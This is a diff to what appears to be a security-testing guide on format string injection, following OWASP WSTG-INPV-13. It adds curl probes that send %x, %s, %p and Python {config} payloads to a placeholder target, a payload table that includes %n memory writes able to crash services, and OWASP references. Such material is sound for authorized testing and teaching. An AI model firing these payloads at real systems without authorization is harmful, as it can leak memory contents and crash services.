@@ -8,8 +8,8 @@ author: cyberstrike-official
 tags: [injection, input-validation, xss, sqli, wstg, inpv]
 tech_stack: []
 cwe_ids: []
-chains_with: []
-prerequisites: []
+chains_with: [wstg-inpv-01, wstg-inpv-02]
+prerequisites: [wstg-conf-01, wstg-conf-02]
 severity_boost: {}
 ---
 
@@ -305,6 +305,29 @@ AAAA%08x.%08x.%08x.%08x.%08x
 
 ---
 
+## Example Commands/Payloads
+
+```bash
+# Basic detection
+curl -s "https://{target}/api?name=%25x%25x%25x%25x%25x"
+curl -s "https://{target}/api?name=%25s%25s%25s%25s%25s"
+
+# Direct parameter access (glibc printf)
+curl -s "https://{target}/api?name=%25p.%25p.%25p.%25p"
+
+# Python format-string probe
+curl -s "https://{target}/api?name=%7Bconfig%7D"
+```
+
+| Payload | Technique | Detection Pattern |
+| --- | --- | --- |
+| `%x%x%x%x%x` | Stack memory read (hex) | Unexplained hex sequence in response, absent from baseline |
+| `%n%n%n%n%n` | Memory write / crash | 500 error or connection reset |
+| `%1$x`, `%2$x`, ... | Direct positional parameter read | Sequential hex values returned per position |
+| `{config}` / `{self.__class__.__mro__}` | Python `.format()` injection | Object repr / class names leaked in response |
+
+---
+
 ## Remediation
 
 ```c
@@ -346,6 +369,13 @@ print(f"{user_input}")
 | ----------- | ------------------------------------------ |
 | **CWE-134** | Use of Externally-Controlled Format String |
 
+
+---
+
+## References
+
+- [OWASP WSTG - WSTG-INPV-13: Testing for Format String Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Format_String_Injection)
+- [OWASP - Format String Attack](https://owasp.org/www-community/attacks/Format_string_attack)
 
 ---
 
